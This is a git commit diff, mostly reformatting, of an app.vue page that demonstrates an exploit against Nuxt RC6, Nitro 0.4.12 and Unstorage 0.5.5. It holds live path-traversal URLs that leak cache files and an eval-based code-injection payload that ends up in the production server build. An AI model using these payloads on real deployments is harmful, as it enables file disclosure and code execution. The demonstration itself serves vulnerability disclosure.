8b781d28d1f158e7412c00c3f377022359923933
OhB00 <43827372+OhB00@users.noreply.github.com>
2023-05-05 11:29:24 +0100

    1 file modified

--- app.vue
+++ app.vue
@@ -1,31 +1,40 @@
 <template>
   <div>
-    Nuxt RC6, Nitro 0.4.12, Unstorage 0.5.5 Exploit 
-    
+    Nuxt RC6, Nitro 0.4.12, Unstorage 0.5.5 Exploit
+
     <ol>
       <li>
-        <NuxtLink to="/api/bryce" target="_blank">Try this link, you can see my name!</NuxtLink>. If you explore the .nuxt/cache folder you'll find the cached file.
+        <NuxtLink to="/api/bryce" target="_blank"
+          >Try this link, you can see my name!</NuxtLink
+        >. If you explore the .nuxt/cache folder you'll find the cached file.
       </li>
 
       <li>
-        <NuxtLink to="/api/..:..:..:..:..:..:public:test" target="_blank">Try this link.</NuxtLink> then <NuxtLink to="/test.json" target="_blank">this link.</NuxtLink> You've leaked a cache file!
+        <NuxtLink to="/api/..:..:..:..:..:..:public:test" target="_blank"
+          >Try this link.</NuxtLink
+        >
+        then
+        <NuxtLink to="/test.json" target="_blank">this link.</NuxtLink> You've
+        leaked a cache file!
       </li>
-
 
       <li>
-        <NuxtLink to="/api/..:..:..:..:..:..:server:assets:'+eval('console.log(`hacked!`);`blah`')+'" target="_blank">Try this link.</NuxtLink> then run a production build (make sure you're on linux).
+        <!-- We need to use :server:assets because Nuxt's assets directory is special.-->
+        <NuxtLink
+          to="/api/..:..:..:..:..:..:server:assets:'+eval('console.log(`hacked!`);`blah`')+'"
+          target="_blank"
+          >Try this link.</NuxtLink
+        >
+        then run a production build (make sure you're on linux).
       </li>
 
       <li>
-        Have a look at the ./output/server/chunks/nitro/node-server.mjs file. Look for "const _assets = {"
+        Have a look at the ./output/server/chunks/nitro/node-server.mjs file.
+        Look for "const _assets = {"
       </li>
 
-      
-      <li>
-        Run your new build!
-      </li>
+      <li>Run your new build!</li>
     </ol>
-  
   </div>
 </template>
 
